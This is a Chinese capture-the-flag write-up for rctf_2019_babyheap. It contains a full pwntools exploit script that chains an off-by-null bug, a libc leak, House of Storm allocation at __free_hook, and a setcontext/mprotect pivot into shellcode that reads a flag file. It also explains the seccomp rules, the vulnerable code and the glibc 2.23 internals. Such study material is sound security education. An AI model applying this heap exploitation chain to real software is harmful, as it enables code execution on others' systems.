
```python
from pwn import \*
from p4f import core
context.log\_level = 'debug'
p = core.Pwn('./rctf\_2019\_babyheap',"node3.buuoj.cn",27623,0)
libc = ELF("/lib/x86\_64-linux-gnu/libc.so.6")
def menu(idx):
p.ru("Choice: \n")
p.sl(str(idx))
def add(size):
menu(1)
p.ru("Size: ")
p.sl(str(size))
def edit(idx,content):
menu(2)
p.ru("Index: ")
p.sl(str(idx))
p.ru("Content: ")
p.s(content)
def delete(idx):
menu(3)
p.ru("Index: ")
p.sl(str(idx))
def show(idx):
menu(4)
p.ru("Index: ")
p.sl(str(idx))
def z():
core.Log("libc = ",libcbase)
core.debug(p)
add(0x68) #0
add(0x68) #1
add(0xf0) #2
add(0x20) #3
add(0x68) #4
add(0x68) #5
payload = 'a'\*0x60 + p64(0xe0)
delete(0)
edit(1,payload)
delete(2)
add(0x68) #0
add(0x68) #2 also 1
add(0xf0) #6
delete(1)
show(2)
leak = u64(p.rn(6)+'\x00\x00')
libcbase = leak + 0x7eff37a11000 - 0x7eff37dd5b78
max\_fast = libcbase + 0x7f3df1b2a7f8 - 0x7f3df1764000
free\_hook = libcbase + libc.symbols["\_\_free\_hook"]
core.Log("libc = ",libcbase)
add(0x68) #clear unsorted bin #1 also 2
add(0x68) #7
add(0x4b0) #8
add(0x20) #9
add(0x4e8) #10
add(0xf0) #11
add(0x20) #12
add(0x100) #13
delete(7)
pre\_size = 0x70 + 0x4c0 + 0x30 + 0x4f0
payload = 'a'\*0x4e0 + p64(pre\_size)
edit(10,payload)
delete(11)
add(0xb40) #7
payload = 'a'\*0x68 + p64(0x4c1) + 'a'\*0x4b0
payload += p64(0) + p64(0x31) + 'a'\*0x20
payload += p64(0) + p64(0x4f1) + 'a'\*0x4e8
payload += p64(0x101)
edit(7,payload)
delete(8)
delete(10)
add(0x4e8) #8
delete(8)
fake\_chunk = free\_hook - 0x10
payload = 'a'\*0x68 + p64(0x4c1) + p64(0) + p64(fake\_chunk+8)+ p64(0) + p64(fake\_chunk-0x18-5)+'a'\*0x490
payload += p64(0) + p64(0x31) + 'a'\*0x20
payload += p64(0) + p64(0x4f1) + p64(0) + p64(fake\_chunk) + 'a'\*0x4d8
payload += p64(0x101)
edit(7,payload)
add(0x48) #8 get free\_hook
page = free\_hook & 0xfffffffffffff000
shellcode1 = '''
xor rdi, rdi
mov rsi, {}
mov rdx, 0x1000
mov rax, 0
syscall
jmp rsi
'''.format(page)
context.arch = "amd64"
frame = SigreturnFrame()
frame.rsp = free\_hook + 8
frame.rbp = free\_hook + 8
frame.rip = libcbase + libc.symbols['mprotect'] # 0xe0 something strange
frame.rdi = page
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1
edit(13,str(frame))
edit(8,p64(libcbase+libc.symbols["setcontext"]+53)+p64(free\_hook+0x10)+asm(shellcode1))
delete(13)
shellcode2 = '''
mov rax, 0x67616c662f2e ;// ./flag
push rax
mov rdi, rsp ;// ./flag
mov rsi, 0 ;// O\_RDONLY
xor rdx, rdx ;// 0
mov rax, 2 ;// SYS\_open
syscall
mov rdi, rax ;// fd
mov rsi,rsp ;// stack
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS\_read
syscall
mov rdi, 1 ;// fd
mov rsi, rsp ;// buf
mov rdx, rax ;// count
mov rax, 1 ;// SYS\_write
syscall
mov rdi, 0 ;// error\_code
mov rax, 60
syscall
'''
sleep(0.5)
p.s(asm(shellcode2))
print p.r()
#z()
p.ia()
```

Ex师傅的exp:<mark class="encrypted">0c7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2W2L8$3&6W2N6#2)9J5k6h3y4F1i4K6u0r3j5i4u0U0K9r3W2$3k6i4y4Q4x3V1j5I4x3o6l9H3</mark>

## 总结
- 其中`House of storm`给我们提供了一种任意地址`malloc`的利用方法，而`setcontext`则给了我们一个在劫持程序执行流的方法，特别是这种方法可以让我们注入`shellcode`
- 如果这道题还有一种解法，是利用`fastbin atk`，没有仔细看，文章链接：<mark class="encrypted">049K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6F1x3e0x3J5i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1j5J5x3o6p5&6i4K6u0r3x3o6g2Q4x3V1j5J5x3g2)9J5c8U0t1H3x3e0W2Q4x3X3b7H3y4g2)9J5k6o6t1I4i4K6u0V1f1V1y4f1c8U0t1H3x3e0W2Q4x3X3c8n7j5h3u0&6K9r3g2S2M7q4)9J5c8R3`.</mark>
- 在最近的`glibc`中`house of storm`应该是不能这样利用了，这道题的环境是`Ubuntu 16, glibc 2.23`
- Ex师傅的博客：<mark class="encrypted">5e8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2W2L8$3&6W2N6#2)9J5k6h3y4F1i4K6u0r3j5i4u0U0K9r3W2$3k6i4y4Q4x3V1j5I4x3o6l9H3</mark>
- 认识有限，文章可能存在错误，希望师傅们斧正

# 一道house of storm的heap题目

原题：`rctf_2019_babyheap`

复现：赵师傅479K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1N6i4g2G2K9W2)9J5k6h3y4F1i4K6u0r3j5$3S2S2L8r3I4W2L8X3N6W2M7#2)9J5x3%4u0U0N6r3k6Q4y4h3j5J5x3o6p5&6i4K6g2X3j5X3q4T1P5h3S2W2j5i4l9`.

## 题目分析

### 保护
```
Arch:     amd64-64-little

RELRO:    Full RELRO

Stack:    Canary found

NX:       NX enabled

PIE:      PIE enabled
```
全开没有，没给写`got`表

```
line  CODE  JT   JF      K

=================================

0000: 0x20 0x00 0x00 0x00000004  A = arch

0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003

0002: 0x06 0x00 0x00 0x00000000  return KILL

0003: 0x20 0x00 0x00 0x00000000  A = sys_number

0004: 0x15 0x00 0x01 0x00000029  if (A != socket) goto 0006

0005: 0x06 0x00 0x00 0x00000000  return KILL

0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008

0007: 0x06 0x00 0x00 0x00000000  return KILL

0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010

0009: 0x06 0x00 0x00 0x00000000  return KILL

0010: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0012

0011: 0x06 0x00 0x00 0x00000000  return KILL

0012: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0014

0013: 0x06 0x00 0x00 0x00000000  return KILL

0014: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0016

0015: 0x06 0x00 0x00 0x00000000  return KILL

0016: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0018

0017: 0x06 0x00 0x00 0x00000000  return KILL

0018: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0020

0019: 0x06 0x00 0x00 0x00000000  return KILL

0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
禁掉了`execve`，这个就很难受了。写`hook`到`system`或者是`one_gadget`就行不通了。

而且这个程序`__free_hook`的附近找不到合适的`chunk`。

设置了`global_max_fast = 0x16` (`mallopt(1,0)`)

程序逻辑：标准的菜单题，`add`、`delete`、`edit`、`show`都有实现。

### 漏洞
漏洞倒是很明显，`edit`处在一处`off-by-null`。
```
unsigned __int64 edit()
{
  int v0; // ST00_4
  int read_size; // ST04_4
  __int64 idx; // [rsp+0h] [rbp-10h]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index: ");
  LODWORD(idx) = get_int();
  if ( idx >= 0 && idx <= 15 && ptrs[idx].pchunk )
  {
    printf("Content: ", idx);
    read_size = read_n(ptrs[v0].pchunk, ptrs[v0].size);
    *(ptrs[v0].pchunk + read_size) = 0;         // off-by-null
    puts("Edit success :)");
  }
  else
  {
    puts("Invalid index :(");
  }
  return __readfsqword(0x28u) ^ v4;
```
### 解题思路
这里用了Ex师傅的方案。Ex师傅tql
- leak
  `off-by-null` + `unlink`构造`overlap`
- 控制`__free_hook`
- 写`__free_hook`到`setcontext`，控制寄存器，执行`mprotect`
- `shellcode`注入`getshell`

膜一下Ex大佬----------------------

## 一些学到的（骚）操作

### house of storm
- 作用：
  任意位置分配`chunk`
- house of storm 利用条件：
  > 可以控制`unsorted bin`和`large bin`
  >
  > 任意地址`chunk`的`size`的低四位要为0
  (其中第二点我不知道有什么含义，期望理解了的师傅教教我)
- 理解：
  从我今天一下午的浅薄认知来讲，`house of storm`更像是`unsorted bin`利用加上`large bin`利用。
  其中，`unsorted bin`利用负责把`fake_chunk`链人`unsorted bin`链表中，从而让我们有机会`malloc`出来
  而`large bin`利用主要是负责绕过从`unsorted bin` `malloc`出来`chunk`的`size check`。
  关与`house of storm`的利用原理，在这个文章里有提到57aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5#2x3U0j5#2i4@1f1K6i4K6R3H3i4K6R3J5
  我觉得这个漏洞还是分开看比较好理解，第一部分是`unsorted bin`的部分
  - 源码：
```
  /* remove from unsorted list */
  unsorted_chunks (av)->bk = bck;
  bck->fd = unsorted_chunks (av);

  /* Take now instead of binning if exact fit */

  if (size == nb)
  {
      set_inuse_bit_at_offset (victim, size);
      if (av != &main_arena)
          victim->size |= NON_MAIN_ARENA;
      check_malloced_chunk (av, victim, nb);
      void *p = chunk2mem (victim);
      alloc_perturb (p, bytes);
      return p;
  }
```
代码来自`glibc2.23/malloc/malloc.c#__int_malloc`
新的版本这个地方已经不太一样了，添加了对当前取出的`chunk`的检测，类似与`check(bck->fd = victim)`的操作，但是在2.23中还没有。
通过代码我们可以发现，在解链的时候，`unsorted bin`中的第一个`chunk`的`fd`实际上是没有用到的，
通过控制`bk`我们就可以把一个`fake_chunk`链入，尽管这种情况下，`unsorted bin`的双向链表被破坏。但是对于这个利用，没有什么关系。另外，当我们申请的`size`大小，也就是`nb`，等于当前`chunk`的`size`的时候，就会把这个`chunk`返回给我们。
通过这样的利用将`fake_chunk`上链
